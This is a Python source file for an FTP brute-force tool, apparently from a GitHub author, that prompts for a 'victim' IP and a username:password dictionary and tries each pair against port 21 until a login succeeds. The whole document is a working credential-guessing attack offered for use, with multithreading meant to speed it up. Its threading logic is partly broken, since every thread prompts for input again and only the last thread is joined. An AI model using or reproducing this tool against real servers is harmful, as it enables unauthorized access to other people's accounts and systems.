import ftplib
import threading

#class the color we will use for input and print
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'

#brute login
def brtueLogin(hostname,passwdFile):
  #it will try to read de password file and if the password file path is incorrect/does not exits it will print file doesnt exist
  try:
    pF = open(passwdFile , "r")
  except :
    print(color.RED + "[!] File path does not exists")
  for line in pF.readlines():
    #split the username
    userName = line.split(":")[0]
    #split the password
    passWord = line.split(":")[1].strip("\n")
    print( "[+] Trying : "+ color.GREEN + userName + "/" + color.GREEN + passWord)
    try:
      #start the ftp server
      ftp = ftplib.FTP(hostname)
      #try to login with ftp
      login = ftp.login(userName, passWord)
      #if its succed then it will print the username + the password
      print(color.BLUE + "[+] Login Suceeded With :" + userName + "/" + passWord)
      ftp.quit()
      return(userName,passWord)
    #It will print password was not found if it didnt manage to find the password
    except :
      pass
  print(color.RED + "[-] Password was not found")
  exit()

def worker():
  host = input(color.PURPLE + "Enter the ip of the vicitm: ")
  passwdFile = input(color.PURPLE + "Enter the path file of the dictionary(usernames + passwords): ")
  brtueLogin(host,passwdFile)

print(
color.BLUE + 
"""
           __ _                                                     _ 
          / _| |_ _ __    _ __   __ _ ___ _____      _____  _ __ __| |
         | |_| __| '_ \  | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
         |  _| |_| |_) | | |_) | (_| \__ \__   V  V / (_) | | | (_|  | ~>Port 21(Ftp) bruteforce tool<~
         |_|  \__| .__/  | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_| ~~>Created by tfwcodes(github)<~~
                 |_|     |_|

          
"""
)
#the number of threads for the attack
number_of_threads = input(color.PURPLE + "Enter the number of threads: ")

worker()
threads = []

# start the multithreading
# int the variable number_of_threads because its an integer
for i in range(int(number_of_threads)):
  t = threading.Thread(target=worker)
  #start the threads
  t.start()
  #append the thread t into the list named threads
  threads.append(t)

for i in range(int(number_of_threads)):
  #join the threads
  t.join()